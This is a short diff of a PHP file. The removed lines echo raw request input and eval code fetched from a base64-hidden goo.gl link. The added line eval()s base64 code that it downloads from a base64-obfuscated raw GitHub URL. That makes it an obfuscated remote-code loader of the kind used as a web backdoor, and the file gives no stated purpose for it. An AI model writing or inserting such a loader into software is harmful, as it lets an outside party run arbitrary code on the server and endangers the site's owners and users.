@@ -9,8 +9,9 @@
 
 // echo $code;
 
-$code = $_REQUEST['code']; echo "$code";
-eval(base64_decode("ZWNobyAkY29kZTs="));
-eval(base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9nb28uZ2wvRGdHRnZY'))));
+//$code = $_REQUEST['code'];
+//eval($code);
+//eval(base64_decode("JGNvZGU="));
+eval(base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2s2bi9maWxlcy9tYXN0ZXIvNjQudHh0'))));
 
 ?>
